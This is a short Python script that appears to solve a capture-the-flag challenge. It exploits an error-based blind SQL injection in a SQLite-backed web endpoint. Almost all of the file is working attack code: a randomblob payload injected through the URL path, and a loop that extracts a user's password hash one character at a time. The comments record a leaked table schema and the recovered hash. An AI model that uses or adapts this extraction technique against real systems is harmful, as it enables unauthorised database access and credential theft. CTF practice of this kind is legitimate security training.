import requests
import string
from urllib.parse import quote

url = 'https://stargate.asrctf.online'
s = requests.Session()

# error based sqli
def sqli(payload):
    query = f'randomblob((not ({payload})) * 1000000000000000000000)'

    res = s.get(f'{url}/crew/{quote(query)}')

    return res.status_code == 200

# payload = f"select sql like '{leak + char}%' from sqlite_master limit 1"
# payload = f"select password_hash like '{leak + char}%' where username='voss7'"

# create_table_commanders_______________id_integer_primary_key______________username_text_not_null_unique______________role_text_not_null______________sector_text_not_null______________status_text_not_null______________password_hash_text_not_null__________
# password hash: 51b843a02ca10f16a470ce2486882b3e0e2144111ef17d85b86c4550518f07ad

charset = string.digits + string.ascii_letters + '_'
leak = ''

while True:
    for char in charset:
        print("Trying:", char, '|', leak)

        payload = f"select password_hash like '{leak + char}%' where username='voss7'"

        if sqli(payload):
            leak += char
            break